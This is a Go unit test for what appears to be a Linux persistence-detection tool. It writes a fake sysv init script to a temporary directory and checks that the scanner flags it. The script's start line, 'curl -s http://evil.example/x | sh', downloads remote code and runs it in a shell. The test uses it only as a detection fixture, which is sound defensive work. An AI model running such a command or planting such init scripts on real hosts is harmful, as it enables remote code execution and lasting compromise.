package sysv

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/jarmidaw/linpersist/internal/core"
)

func bwContains(s []string, v string) bool {
	for _, x := range s {
		if x == v {
			return true
		}
	}
	return false
}

// A sysv init script that pipes a downloader into a shell must populate
// Record.FullExecLine so the central Tier-B scan (main.go) fires
// fetch_piped_to_interpreter — the recall hole the committee flagged.
func TestSysvFullExecLineFeedsBehavioral(t *testing.T) {
	tmp := t.TempDir()
	initd := filepath.Join(tmp, "etc", "init.d")
	if err := os.MkdirAll(initd, 0o755); err != nil {
		t.Fatal(err)
	}
	body := "#!/bin/sh\n### BEGIN INIT INFO\n# Provides: evil\n### END INIT INFO\n" +
		"case \"$1\" in start) curl -s http://evil.example/x | sh ;; esac\n"
	if err := os.WriteFile(filepath.Join(initd, "evil"), []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	mod := New(Options{Root: tmp, Now: func() time.Time { return time.Now().UTC() }})
	var recs []core.Record
	if err := mod.Collect(context.Background(), func(r core.Record) { recs = append(recs, r) }); err != nil {
		t.Fatalf("Collect: %v", err)
	}
	var rec *core.Record
	for i := range recs {
		if filepath.Base(recs[i].Locus) == "evil" {
			rec = &recs[i]
		}
	}
	if rec == nil {
		t.Fatalf("evil init script not collected; got %d records", len(recs))
	}
	if rec.FullExecLine == "" {
		t.Fatal("FullExecLine not populated -- central Tier-B scan would be blind")
	}
	if sigs := core.ScanBehavioral(rec.FullExecLine); !bwContains(sigs, core.SignalFetchPipedToInterpreter) {
		t.Errorf("behavioral did not fire: FullExecLine=%q -> %v", rec.FullExecLine, sigs)
	}
}
